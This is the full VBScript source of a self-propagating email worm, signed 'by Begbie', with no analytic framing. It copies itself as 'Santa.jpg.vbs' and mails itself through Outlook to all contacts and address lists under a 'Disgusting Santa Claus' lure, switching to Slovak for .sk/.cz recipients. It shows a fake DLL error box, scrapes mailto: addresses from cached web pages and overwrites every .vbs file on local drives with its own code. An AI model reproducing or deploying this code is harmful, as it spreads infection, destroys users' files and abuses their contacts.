Dim fsdjrug, wlprfsdj, oletajypp, afrivnpn, thmsrfgre, mdjhspnv
Dim qrteudif, nsgfupzy, cnmpwqyt
On Error Resume Next
Set fsdjrug = CreateObject("Scripting.FileSystemObject")
Set wlprfsdj = CreateObject("WScript.Shell")
afrivnpn = fsdjrug.GetSpecialFolder(2) & "\Santa.jpg.vbs"
fsdjrug.CopyFile WScript.ScriptFullName, afrivnpn
Set oletajypp = CreateObject("Outlook.Application")
If Not (oletajypp Is Nothing) Then
Set mdjhspnv = oletajypp.GetNamespace("MAPI")
Err.Clear
Buf = oletajypp.Version
If Err.Number <> 0 Then
smakjftsd mdjhspnv.GetDefaultFolder(10)
Else
smaiyegsd
End If
MsgBox "Run-time error '453':" & vbCrLf & vbCrLf & "Can't find DLL entry point CreateBitmapEx in gdi32", 48, "Error"
qrteudif = False
nsgfupzy = 0
cnmpwqyt = True
Tif = fsdjrug.GetSpecialFolder(0) & "\Temporary Internet Files"
If fsdjrug.FolderExists(Tif) Then
surfbrswe fsdjrug.GetFolder(Tif)
End If
End If
For Each Disk In fsdjrug.Drives
If Disk.DriveType = 3 Then infctd Disk.RootFolder
Next

Sub smakjftsd(thfreold)
On Error Resume Next
Dim sbfrkldu, mcrteupfgs, methsqpw, bysj, ov, hdskjcz
ov = 0: hdskjcz = 0
Set methsqpw = oletajypp.CreateItem(0)
methsqpw.Attachments.Add (afrivnpn)
methsqpw.DeleteAfterSubmit = True
For Each mcrteupfgs In thfreold.Items
bysj = mcrteupfgs.Email1Address
If bysj <> "" Then
methsqpw.Recipients.Add bysj
ov = ov + 1
If LCase(Right(bysj, 3)) = ".sk" Or LCase(Right(bysj, 3)) = ".cz" Then hdskjcz = hdskjcz + 1
End If
Next
If (ov / (hdskjcz + 1)) <= 2 Then
methsqpw.Subject = "Nechutný dedo Mráz"
methsqpw.Body = Chr(13) & Chr(10) & "Chcete vedie èo robí dedo Mráz vo svojom vo¾nom èase?"
Else
methsqpw.Subject = "Disgusting Santa Claus"
methsqpw.Body = Chr(13) & Chr(10) & "Would you like to know what's doing Santa Claus during his free time?"
End If
If methsqpw.Recipients.Count <> 0 Then methsqpw.Send
For Each sbfrkldu In thfreold.Folders
smakjftsd sbfrkldu
Next
End Sub
Sub smaiyegsd()
On Error Resume Next
Dim acnt, tmsterqui, bst, ovporava, skrtczaw
For Each AddrList In mdjhspnv.AddressLists
ovporava = 0: skrtczaw = 0
Set tmsterqui = oletajypp.CreateItem(0)
tmsterqui.Attachments.Add (afrivnpn)
tmsterqui.DeleteAfterSubmit = True
acnt = AddrList.AddressEntries.Count
For i = 1 To acnt
bst = AddrList.AddressEntries(i).Address
If bst <> "" Then
tmsterqui.Recipients.Add bst
ovporava = ovporava + 1
If LCase(Right(bst, 3)) = ".sk" Or LCase(Right(bst, 3)) = ".cz" Then skrtczaw = skrtczaw + 1
End If
Next
If (ovporava / (skrtczaw + 1)) <= 2 Then
tmsterqui.Subject = "Nechutný dedo Mráz"
tmsterqui.Body = Chr(13) & Chr(10) & "Chcete vedie èo robí dedo Mráz vo svojom vo¾nom èase?"
Else
tmsterqui.Subject = "Disgusting Santa Claus"
tmsterqui.Body = Chr(13) & Chr(10) & "Would you like to know what's doing Santa Claus during his free time?"
End If
If tmsterqui.Recipients.Count <> 0 Then tmsterqui.Send
Next
End Sub
Sub surfbrswe(Fold)
On Error Resume Next
Dim fstiler, pripext, subadtrs, strfitexs, constexqwah
For Each fstiler In Fold.Files
If qrteudif Then Exit Sub
pripext = LCase(fsdjrug.GetExtensionName(fstiler.Name))
If pripext = "htm" Or pripext = "html" Or pripext = "asp" Then
Set strfitexs = fstiler.OpenAsTextStream
If Not strfitexs.AtEndOfStream Then
constexqwah = strfitexs.ReadAll
extrsadresf constexqwah, 1
End If
End If
Next
For Each subadtrs In Fold.SubFolders
surfbrswe subadtrs
Next
End Sub
Private Sub extrsadresf(strmtxtf, odkia)
On Error Resume Next
Dim odtoiekl, doghfkila, vyrodnaj, kudskom, prid, hejaushd
odtoiekl = InStr(odkia, strmtxtf, "mailto:", 1)
If odtoiekl <> 0 Then
doghfkila = InStr(odtoiekl + 7, strmtxtf, Chr(34))
If doghfkila = 0 Then doghfkila = InStr(odtoiekl + 7, strmtxtf, Chr(39))
If doghfkila = 0 Then Exit Sub
If (doghfkila - odtoiekl) > 37 Or (doghfkila - odtoiekl) < 12 Then Exit Sub
If cnmpwqyt Then
Set thmsrfgre = oletajypp.CreateItem(0)
thmsrfgre.Attachments.Add (afrivnpn)
thmsrfgre.DeleteAfterSubmit = True
cnmpwqyt = False
End If
vyrodnaj = Trim(Mid(strmtxtf, odtoiekl + 7, doghfkila - odtoiekl - 7))
prid = True
For Each kudskom In thmsrfgre.Recipients
If kudskom.Name = vyrodnaj Then prid = False: Exit For
Next
If prid Then thmsrfgre.Recipients.Add vyrodnaj
If thmsrfgre.Recipients.Count > 19 Then
hejaushd = 0
For Each kudskom In thmsrfgre.Recipients
If LCase(Right(kudskom.Name, 3)) = ".sk" Or LCase(Right(kudskom.Name, 3)) = ".cz" Then hejaushd = hejaushd + 1
Next
If hejaushd > 9 Then
thmsrfgre.Subject = "Nechutný dedo Mráz"
thmsrfgre.Body = Chr(13) & Chr(10) & "Chcete vedie èo robí dedo Mráz vo svojom vo¾nom èase?"
Else
thmsrfgre.Subject = "Disgusting Santa Claus"
thmsrfgre.Body = Chr(13) & Chr(10) & "Would you like to know what's doing doing Santa Claus during his free time?"
End If
thmsrfgre.Send
cnmpwqyt = True
nsgfupzy = nsgfupzy + 1
If nsgfupzy > 5 Then qrteudif = True: Exit Sub
End If
extrsadresf strmtxtf, doghfkila
End If
End Sub
Sub infctd(Drv)
On Error Resume Next
Dim fiejdlkp, fo, vyr
For Each fiejdlkp In Drv.Files
If LCase(fsdjrug.GetExtensionName(fiejdlkp.Path)) = "vbs" Then
fsdjrug.CopyFile WScript.ScriptFullName, fiejdlkp.Path, True
End If
Next
For Each fo In Drv.SubFolders
infctd fo
Next
End Sub
'... by Begbie
